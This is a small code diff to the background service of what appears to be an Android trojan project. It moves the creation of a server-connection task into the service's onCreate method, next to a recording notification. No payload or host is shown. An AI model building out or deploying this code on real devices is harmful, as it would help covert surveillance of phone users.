@@ -17,7 +17,7 @@ import trojan.android.android_trojan.R;
 public class BackgroundService extends Service {
     private static final String TAG = "BackgroundService";
 
-    private ConnectionServerTask connectionServerTask = new ConnectionServerTask();
+    private ConnectionServerTask connectionServerTask;
 
     @Override
     public IBinder onBind(Intent intent) {
@@ -29,9 +29,8 @@ public class BackgroundService extends Service {
         super.onCreate();
         Log.d(TAG, "onCreate");
         showRecordingNotification();
-
+        connectionServerTask = new ConnectionServerTask(getApplicationContext());
         connectionServerTask.execute();
-
         Log.d(TAG, connectionServerTask.getStatus().toString());
     }
 
